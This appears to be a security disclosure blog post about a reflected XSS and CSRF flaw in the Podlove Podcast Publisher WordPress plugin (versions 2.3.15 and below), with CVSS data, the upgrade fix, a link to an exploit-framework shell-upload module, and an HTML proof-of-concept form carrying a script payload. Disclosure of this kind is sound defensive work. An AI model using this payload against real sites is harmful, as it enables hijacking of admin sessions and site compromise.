---
layout: post
title: Podlove Podcast Publisher <= 2.3.15 Reflected XSS
date: 2017-01-21
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - podlove podcast publisher
  - reflected xss
excerpt: Due to a lack of CSRF mitigation and entity encoding in `lib/episode_asset_list_table.php`, it is possible to execute scripts in the context of an admin user by including a script in the `page` field during a form post.
---
## Homepage
[https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/](https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/)

## Overview
Due to a lack of CSRF mitigation and entity encoding in `lib/episode_asset_list_table.php`, it is possible to execute scripts in the context of an admin user by including a script in the `page` field during a form post.

## CVSS Score
4.8

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))

## Versions Affected
2.3.15 and below

## Solution
Upgrade to the latest version of the plugin

## WordPress Exploit Framework Module
[exploit/xss/reflected/podlove\_podcast\_publisher\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/lib/wpxf/modules/exploit/xss/reflected/podlove_podcast_publisher_reflected_xss_shell_upload.rb)

## Proof of Concept
```xml
<form method="POST" action="[target]/wp-admin/admin.php?page=podlove_episode_assets_settings_handle">
  <input type="text" name="page" value="&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href=&quot;">
  <input type="submit">
</form>
```

## WPVDB-ID
[8697](https://wpvulndb.com/vulnerabilities/8697)
